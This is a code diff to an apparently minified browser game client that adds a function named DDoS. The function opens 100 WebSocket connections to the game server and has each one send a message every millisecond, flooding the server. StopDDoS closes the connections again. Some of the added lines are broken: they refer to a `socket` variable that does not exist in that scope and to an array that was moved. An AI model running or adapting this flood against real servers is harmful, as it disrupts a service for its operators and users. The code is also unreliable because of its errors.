@@ -7512,30 +7512,20 @@ function K(e, o, i, t, n) {
       e.push(r(o));
   return e;
 }
-let sockets = []; 
+window.sockets = []; 
 
 function DDoS() {
     const numSockets = 100; 
 
     for (let i = 0; i < numSockets; i++) {
         const socket = vw.connect(true);
-        sockets.push(socket); // Store reference to the socket
-        socket.onmessage = function(event) {
-            if (event.data === "string") {
-                const msg = JSON.parse(event.data);
-                switch (msg[0]) {
-                    case 3:
-                        setInterval(() => {
-                            socket.oOW.send(JSON.stringify([11]));
-                        }, 1);
-                }
-            }
-        };
     }
 }
 function StopDDoS() {
     sockets.forEach(socket => {
-        socket.close(); // Close each socket
+        try {
+            socket.close(); // Close each socket
+        } catch (err){}
     });
     sockets = []; // Clear the array of socket references
 }
@@ -91084,9 +91074,7 @@ vw = new (function () {
               });
         }
         if (skip) {
-            console.groupEnd();
-            console.group("returned socket");
-            return this.oOW
+            window.sockets.push(this.oOW); 
         }
         (this.oOW.binaryType = "arraybuffer"),
         (this.oOW.wOQ = this.wOQ),
@@ -91105,6 +91093,11 @@ vw = new (function () {
                   break;
                 case 3:
                   o.v_ouo(e);
+                  if (skip) {
+                    setInterval(() => {
+                        socket.oOW.send(JSON.stringify([11]));
+                        }, 1);
+                  }
                   break;
                 case 4:
                   o.message(e[1]);
